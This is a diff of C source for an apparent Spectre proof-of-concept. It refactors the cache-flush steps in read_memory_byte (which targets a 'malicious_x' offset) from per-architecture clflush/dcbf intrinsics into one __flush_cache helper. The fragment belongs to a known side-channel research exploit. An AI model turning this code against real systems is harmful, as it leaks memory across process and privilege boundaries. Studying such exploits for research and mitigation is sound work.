@@ -8,7 +8,8 @@
 #include "spectre_archs.h"
 #include "spectre_intrinsics.h"
 #include "timer.h"
-#include "cache_latency.h"
+#include "cache.h"
+
 #define ARRLEN(var) (sizeof(var) / sizeof(*var))
 
 #define RESET       "\033[0m"
@@ -53,14 +54,7 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2],
 	for (tries = 999; tries > 0; tries--) {
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++) {
-#if defined(__ARCH_POWERPC__)
-			__dcbf(array2, (i * 512));
-#elif defined(__ARCH_X86__)
-			/* intrinsic for clflush instruction */
-			_mm_clflush(&array2[i * 512]);
-#else
-#error No cache flush implementation exists for your architecture!
-#endif
+			__flush_cache(&array2[(i * 512)]);
 		}
 
 		/* 30 loops: 5 training runs (x = training_x) per attack run (x =
@@ -69,13 +63,7 @@ void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2],
 		for (j = 29; j >= 0; j--) {
 			volatile int z;
 
-#if defined(__ARCH_POWERPC__)
-			__dcbf(&array1_size, 0);
-#elif defined(__ARCH_X86__)
-			_mm_clflush(&array1_size);
-#else
-#error No cache flush implementation exists for your architecture!
-#endif
+			__flush_cache(&array1_size);
 
 			for (z = 0; z < 100; z++); /* Delay (can also mfence) */
 
